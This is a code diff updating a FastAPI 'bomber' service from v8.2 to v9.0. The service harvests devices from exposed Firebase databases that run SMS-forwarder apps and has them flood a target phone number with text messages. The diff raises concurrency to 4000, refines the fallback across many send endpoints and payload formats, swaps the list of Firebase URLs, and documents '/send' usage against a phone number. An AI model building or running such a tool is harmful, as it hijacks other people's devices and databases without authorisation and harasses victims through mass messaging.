@@ -1,22 +1,21 @@
 #!/usr/bin/env python3
 """
 ╔══════════════════════════════════════════════════════════╗
-║   🔥 @BRONX_ULTRA BOMBER API v8.2 — ULTRA FLAS         ║
+║   🔥 @BRONX_ULTRA BOMBER API v9.0 — HYPER FLASH         ║
 ║   ▸ API Key Protected                                   ║
-║   ▸ Firebase URLs — SEEDHA CODE ME                      ║
-║   ▸ TRUE Full Fan-Out                                   ║
-║   ▸ Full Symbol/Space/Emoji Support                     ║
-║   ▸ Multi-Format Payload (auto match)                   ║
-║   ▸ Multi-Endpoint Fallback                             ║
-║   ▸ /stop endpoint (local memory)                       ║
-║   ▸ /debug endpoint (troubleshoot)                      ║
-║   ▸ Render + UptimeRobot Ready                          ║
+║   ▸ 3000+ Devices | 4000+ Concurrent                    ║
+║   ▸ Full Unicode / Emoji / Hindi / Symbols Support      ║
+║   ▸ Multi-Endpoint + Multi-Format Smart Fallback        ║
+║   ▸ /stop endpoint (instant local cancel)               ║
+║   ▸ /debug + /devices + /health endpoints               ║
+║   ▸ Render + Vercel + UptimeRobot Ready                 ║
 ╚══════════════════════════════════════════════════════════╝
 """
 
 import asyncio
 import time
 import os
+import json
 import aiohttp
 from datetime import datetime
 from uuid import uuid4
@@ -35,42 +34,21 @@ VALID_KEYS = {
     "flash-key",
     "bronx-vip",
     "bronx-pro",
-    "bronx-max",
+    "bronx-ox",
 }
 
 # ═══════════════════════════════════════════════════════════
 # 🔥 FIREBASE URLs — YAHAN APNE URLs DAALO
 # ═══════════════════════════════════════════════════════════
-FIREBASE_URLS = [
-    "https://mast-d6890-default-rtdb.asia-southeast1.firebasedatabase.app",
-    "https://hush-e1f72-default-rtdb.firebaseio.com",
-"https://adsinprogess-default-rtdb.firebaseio.com",
-"https://sumnmmn-default-rtdb.firebaseio.com",
-"https://ffdfhf-aa168-default-rtdb.firebaseio.com",
-"https://pussy-25f3c-default-rtdb.firebaseio.com",
-"https://sohan-6d9e1-default-rtdb.firebaseio.com",
-"https://slim-pussy-default-rtdb.firebaseio.com",
-"https://skfd-53f1f-default-rtdb.firebaseio.com",
-"https://e0turnament1-default-rtdb.firebaseio.com",
-"https://sher-61c70-default-rtdb.asia-southeast1.firebasedatabase.app",
-"https://amit-ka-71-default-rtdb.firebaseio.com",
-"https://sachin-38c1d-default-rtdb.firebaseio.com",
-"https://newbhai-99806-default-rtdb.firebaseio.com",
-"https://ssboss4-default-rtdb.firebaseio.com",
-"https://dipukumar21-9cc34-default-rtdb.firebaseio.com",
-"https://teddymcdonald-81002-default-rtdb.firebaseio.com",
-"https://santosh-c4095-default-rtdb.firebaseio.com",
-"https://bhaiyaka-bcbcd-default-rtdb.firebaseio.com",
-"https://nyawala-3e7c3-default-rtdb.asia-southeast1.firebasedatabase.app",
-"https://rahul-admin-b6ebe-default-rtdb.firebaseio.com",
-"https://super-admin-240f4-default-rtdb.firebaseio.com",
-"https://ilohsh-default-rtdb.firebaseio.com",
+FIREBASE_URLS_RAW = [
+    "https://total-ocean-469810-i8-default-rtdb.firebaseio.com",
+    
 ]
 
 # ─── Auto dedupe + clean ───────────────────────────────────
 _seen = set()
 _cleaned = []
-for u in FIREBASE_URLS:
+for u in FIREBASE_URLS_RAW:
     u = u.strip().rstrip("/")
     if u.endswith(".json"):
         u = u[:-5]
@@ -80,92 +58,61 @@ for u in FIREBASE_URLS:
 FIREBASE_URLS = _cleaned
 
 # ═══════════════════════════════════════════════════════════
-# 🎯 SEND ENDPOINTS — Bahut saare try karega
+# 🎯 SEND ENDPOINTS — ordered by success probability
 # ═══════════════════════════════════════════════════════════
 SEND_ENDPOINTS = [
-    # Standard webhook patterns
     "clients/{id}/webhookEvent/sendSms.json",
     "clients/{id}/webhookEvent/sendSmsRequest.json",
     "clients/{id}/webhookEvent/sms.json",
     "clients/{id}/webhookEvent/send.json",
     "clients/{id}/webhookEvent.json",
-    # Direct send patterns
     "clients/{id}/sendSms.json",
     "clients/{id}/sms.json",
     "clients/{id}/send.json",
     "clients/{id}/message.json",
-    # Top-level
     "sendSms/{id}.json",
     "sms/{id}.json",
     "send/{id}.json",
-    # Device direct
     "clients/{id}/messages.json",
     "clients/{id}/inbox.json",
 ]
 
 # ═══════════════════════════════════════════════════════════
-# 📦 PAYLOAD FORMATS — Har format try karega
+# 📦 PAYLOAD FORMATS — ordered by most common first
 # ═══════════════════════════════════════════════════════════
 def build_payloads(target: str, message: str):
-    """Return list of payloads in different formats."""
     ts = int(time.time() * 1000)
     return [
-        # Format 1 — Standard Bronx/Android SMS forwarder
-        {
-            "from": 1,
-            "to": target,
-            "message": message,
-            "isSended": False,
-            "timestamp": ts,
-        },
-        # Format 2 — Android SMS Gateway style
-        {
-            "phone": target,
-            "message": message,
-            "isSended": False,
-            "timestamp": ts,
-        },
-        # Format 3 — Firebase push notification style
-        {
-            "to": target,
-            "body": message,
-            "title": "",
-            "isSended": False,
-            "timestamp": ts,
-        },
-        # Format 4 — Full combo (kuch devices sab fields chahte hain)
-        {
-            "from": 1,
-            "to": target,
-            "phone": target,
-            "number": target,
-            "message": message,
-            "msg": message,
-            "text": message,
-            "body": message,
-            "isSended": False,
-            "status": False,
-            "timestamp": ts,
-        },
-        # Format 5 — Minimal
-        {
-            "to": target,
-            "msg": message,
-        },
+        # Format 1 — Standard Android SMS forwarder
+        {"from": 1, "to": target, "message": message,
+         "isSended": False, "timestamp": ts},
+        # Format 2 — Full combo (works on most devices)
+        {"from": 1, "to": target, "phone": target, "number": target,
+         "message": message, "msg": message, "text": message,
+         "body": message, "isSended": False, "status": False,
+         "timestamp": ts},
+        # Format 3 — phone-style
+        {"phone": target, "message": message,
+         "isSended": False, "timestamp": ts},
+        # Format 4 — push-style
+        {"to": target, "body": message, "title": "",
+         "isSended": False, "timestamp": ts},
+        # Format 5 — minimal
+        {"to": target, "msg": message},
     ]
 
 
 # ═══════════════════════════════════════════════════════════
-# ⚙️ SETTINGS
+# ⚙️ TUNED SETTINGS — for 3000+ devices
 # ═══════════════════════════════════════════════════════════
-MAX_CONCURRENT = 3000
-BATCH_CHUNK = 3000
-REQUEST_TIMEOUT = 8
-CONNECT_TIMEOUT = 3
-DEVICE_CACHE_TTL = 30
+MAX_CONCURRENT = 4000
+BATCH_CHUNK = 500           # smaller chunks for responsiveness
+REQUEST_TIMEOUT = 6
+CONNECT_TIMEOUT = 2
+DEVICE_CACHE_TTL = 25
 
 API_NAME = "@BRONX_ULTRA"
-API_VERSION = "8.2"
+API_VERSION = "9.0"
 
 # ═══════════════════════════════════════════════════════════
 # 🚀 APP
@@ -173,7 +120,7 @@ API_VERSION = "8.2"
 app = FastAPI(
     title=f"🔥 {API_NAME} BOMBER API",
     version=API_VERSION,
-    description="Ultra Firebase Bomber — Flash Speed",
+    description="Hyper Firebase Bomber — 3000+ devices, 4000+ concurrent",
 )
 
 app.add_middleware(
@@ -199,16 +146,16 @@ def verify_key(api_key: str) -> bool:
 def extract_key(request: Request, query_params: dict, body_data: dict) -> str:
     key = request.headers.get("x-api-key") or request.headers.get("X-API-Key")
     if key:
-        return key
+        return key.strip()
     auth = request.headers.get("authorization", "")
     if auth.lower().startswith("bearer "):
         return auth[7:].strip()
     key = query_params.get("key") or query_params.get("api_key")
     if key:
-        return key
+        return key.strip()
     key = body_data.get("key") or body_data.get("api_key")
     if key:
-        return key
+        return str(key).strip()
     return ""
 
 
@@ -216,21 +163,25 @@ def extract_key(request: Request, query_params: dict, body_data: dict) -> str:
 # 🛠️ HELPERS
 # ═══════════════════════════════════════════════════════════
 def clean_url(url: str) -> str:
-    url = url.rstrip("/")
+    url = url.strip().rstrip("/")
     if url.endswith(".json"):
         url = url[:-5]
     return url.rstrip("/")
 
 
 def fix_message(raw_message, is_get: bool) -> str:
+    """Preserve full Unicode / emoji / Hindi / symbols."""
     if raw_message is None:
         return ""
     if not isinstance(raw_message, str):
         raw_message = str(raw_message)
     msg = raw_message
+    # GET: '+' becomes space (standard URL decode)
     if is_get:
         msg = msg.replace("+", " ")
+    # Handle escaped chars
     msg = msg.replace("\\n", "\n").replace("\\t", "\t")
+    msg = msg.replace("\\r", "\r").replace("\\\\", "\\")
     return msg.strip()
 
 
@@ -250,7 +201,6 @@ async def fetch_devices_from(session, url):
             for k, v in data.items():
                 if not isinstance(v, dict):
                     continue
-                # status true ya missing dono accept karo
                 status = v.get("status", True)
                 if status is True or status == "true" or status is None:
                     devices.append({"id": k, "url": base})
@@ -262,8 +212,9 @@ async def fetch_devices_from(session, url):
 async def get_all_devices(session, use_cache=False):
     if use_cache:
         age = time.time() - _DEVICE_CACHE["ts"]
-        if _DEVICE_CACHE["devices"] and age < DEVICE_CACHE_TTL:
-            return _DEVICE_CACHE["devices"]
+        cached = _DEVICE_CACHE["devices"]
+        if cached is not None and age < DEVICE_CACHE_TTL:
+            return cached
 
     results = await asyncio.gather(
         *[fetch_devices_from(session, u) for u in FIREBASE_URLS],
@@ -280,43 +231,50 @@ async def get_all_devices(session, use_cache=False):
 
 
 # ═══════════════════════════════════════════════════════════
-# 💣 SEND ONE — Multi-format + Multi-endpoint try
+# 💣 SEND ONE — Smart fallback strategy
 # ═══════════════════════════════════════════════════════════
 async def send_one(session, device, target, message, sem, stats):
     async with sem:
         payloads = build_payloads(target, message)
+        base_url = device["url"]
+        dev_id = device["id"]
 
-        for ep in SEND_ENDPOINTS:
-            url = f"{device['url']}/{ep.format(id=device['id'])}"
+        for ep_idx, ep in enumerate(SEND_ENDPOINTS):
+            url = f"{base_url}/{ep.format(id=dev_id)}"
 
-            # Har payload format try karo
-            for payload in payloads:
-                # PUT try
-                try:
-                    async with session.put(url, json=payload) as r:
-                        if r.status in (200, 201):
-                            stats["success"] += 1
-                            return True
-                        if r.status == 403:
-                            stats["blocked"] += 1
-                            break  # 403 = blocked, next endpoint try
-                        if r.status == 404:
-                            break  # 404 = endpoint galat, next endpoint
-                except Exception:
-                    pass
+            # First endpoint: try ALL payloads × PUT/POST
+            # Later endpoints: try only 2 payloads (fast fallback)
+            payload_range = range(len(payloads)) if ep_idx == 0 else range(2)
 
-                # POST try
-                try:
-                    async with session.post(url, json=payload) as r:
-                        if r.status in (200, 201):
-                            stats["success"] += 1
-                            return True
-                        if r.status == 403:
-                            break
-                        if r.status == 404:
-                            break
-                except Exception:
-                    pass
+            for p_idx in payload_range:
+                payload = payloads[p_idx]
+
+                for method in ("PUT", "POST"):
+                    try:
+                        if method == "PUT":
+                            async with session.put(url, json=payload) as r:
+                                if r.status in (200, 201):
+                                    stats["success"] += 1
+                                    return True
+                                if r.status == 404:
+                                    break  # wrong endpoint, skip
+                                if r.status == 401:
+                                    stats["blocked"] += 1
+                                    return False  # auth — stop this device
+                        else:
+                            async with session.post(url, json=payload) as r:
+                                if r.status in (200, 201):
+                                    stats["success"] += 1
+                                    return True
+                                if r.status == 404:
+                                    break
+                                if r.status == 401:
+                                    stats["blocked"] += 1
+                                    return False
+                    except asyncio.TimeoutError:
+                        continue
+                    except Exception:
+                        continue
 
         stats["failed"] += 1
         return False
@@ -366,7 +324,7 @@ async def bomb_worker(number: str, message: str, count: int, api_key: str):
         total = ndev * count
 
         print(f"\n{'='*60}")
-        print(f"[{jid}] 🔥 {API_NAME} v{API_VERSION} — ULTRA FLASH")
+        print(f"[{jid}] 🔥 {API_NAME} v{API_VERSION} — HYPER FLASH")
         print(f"[{jid}] Target     : {number}")
         print(f"[{jid}] Devices    : {ndev}")
         print(f"[{jid}] Per-device : {count}")
@@ -428,7 +386,8 @@ async def root():
         "status": "🔥 ONLINE",
         "protected": True,
         "firebases_loaded": len(FIREBASE_URLS),
-        "mode": "ULTRA FLASH",
+        "mode": "HYPER FLASH",
+        "max_concurrent": MAX_CONCURRENT,
         "how_to_use": {
             "send": "/send?key=YOUR_KEY&message=Hi&number=9876543210&count=5",
             "stop": "/stop?key=YOUR_KEY&number=9876543210",
@@ -517,6 +476,8 @@ async def send_endpoint(request: Request, bg: BackgroundTasks):
         count = int(count_str)
         if count <= 0:
             raise ValueError
+        if count > 500:
+            count = 500  # safety cap
     except Exception:
         return JSONResponse(
             {"success": False, "api": API_NAME, "error": "invalid count"}, 400
@@ -533,7 +494,7 @@ async def send_endpoint(request: Request, bg: BackgroundTasks):
         "message_sent": message,
         "message_length": len(message),
         "per_device": count,
-        "mode": "ULTRA FLASH FAN-OUT (multi-format)",
+        "mode": "HYPER FLASH FAN-OUT (multi-format smart)",
         "stop_url": f"/stop?key={api_key}&number={clean_number}",
     }
 
@@ -630,7 +591,7 @@ async def firebases_endpoint():
 
 
 # ═══════════════════════════════════════════════════════════
-# 🔬 /debug — Exact reason batayega
+# 🔬 /debug
 # ═══════════════════════════════════════════════════════════
 @app.get("/debug")
 async def debug_endpoint(request: Request, key: str = Query(None)):
@@ -652,12 +613,10 @@ async def debug_endpoint(request: Request, key: str = Query(None)):
         if not devices:
             return {"success": False, "error": "No devices online"}
 
-        # Pehla device test karo
         test_dev = devices[0]
         target = "9876543210"
-        message = "debug test"
+        message = "debug test 🚀"
 
-        # Device ka full structure dekho
         struct_url = f"{test_dev['url']}/clients/{test_dev['id']}.json"
         device_struct = None
         try:
@@ -666,7 +625,6 @@ async def debug_endpoint(request: Request, key: str = Query(None)):
         except Exception as e:
             device_struct = {"error": str(e)}
 
-        # Har endpoint × har payload test karo
         payloads = build_payloads(target, message)
         results = []
 
